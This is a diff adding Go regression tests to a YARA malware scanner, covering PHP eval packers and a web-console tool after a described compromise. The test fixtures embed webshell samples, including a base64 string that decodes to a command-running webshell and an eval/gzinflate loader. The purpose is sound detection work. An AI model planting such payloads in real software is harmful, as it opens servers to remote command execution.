@@ -397,3 +397,46 @@ func TestFPFlood_MinerXmrigBinaryRef_XmrStakNeedsContext(t *testing.T) {
 		t.Error("miner_xmrig_binary_ref regression: contextual xmr-stak binary strings not detected")
 	}
 }
+
+// The 2026-07-23 hospitalityculture compromise dropped eval-packer webshells
+// that evaded php_eval_base64_chain by concatenating a "?>" literal between
+// eval( and the decoder: eval("?>".base64_decode(...)). The rule required the
+// decoder immediately after eval(, so the packer slipped through.
+func TestFPFlood_EvalDecodeChain_PhpCloseConcatPacker(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php eval("?>".base64_decode("Pz48P3BocCBzeXN0ZW0oJF9HRVRbMF0pOw==")); `)
+	if !hasYaraRule(s.ScanBytes(mal), "php_eval_base64_chain") {
+		t.Error("php_eval_base64_chain regression: eval(\"?>\".base64_decode(...)) packer not detected")
+	}
+	malGz := []byte(`<?= eval('?>' . gzinflate(base64_decode($x))); `)
+	if !hasYaraRule(s.ScanBytes(malGz), "php_eval_base64_chain") {
+		t.Error("php_eval_base64_chain regression: eval('?>'.gzinflate(...)) packer not detected")
+	}
+	// A template engine that evaluates compiled PHP with a "?>" prefix but no
+	// decoder is not a packer loader.
+	legit := []byte(`<?php $compiled = $this->compileTemplate($tpl); eval("?>" . $compiled); `)
+	if hasYaraRule(s.ScanBytes(legit), "php_eval_base64_chain") {
+		t.Error("php_eval_base64_chain FP: matched a template-engine eval with no decoder")
+	}
+}
+
+// The same compromise dropped the nickola/web-console command console tool
+// (terminal.php, button-outline.css.php) which matched no rule: it reads the
+// command through its own auth layer, so the superglobal-to-sink rules never
+// fired.
+func TestFPFlood_WebConsole_Tool(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte("<?php\n// Web Console v0.9.7 (2016-11-05)\n" +
+		"// GitHub: https://github.com/nickola/web-console\n" +
+		"$NO_LOGIN = false;\n$USER = 'Noxipom12';\n$PASSWORD = 'x';\n$ACCOUNTS = array();\n" +
+		"$ACCOUNTS[$USER] = $PASSWORD;\n$p = proc_open($command, $descriptors, $pipes, $cwd);\n")
+	if !hasYaraRule(s.ScanBytes(mal), "webshell_web_console") {
+		t.Error("webshell_web_console regression: nickola web-console command tool not detected")
+	}
+	// Documentation or an admin page that merely mentions "Web Console" is not
+	// the tool.
+	legit := []byte(`<?php /* Settings page: open the Web Console tab to view logs. */ echo "Web Console";`)
+	if hasYaraRule(s.ScanBytes(legit), "webshell_web_console") {
+		t.Error("webshell_web_console FP: matched prose mentioning a web console")
+	}
+}
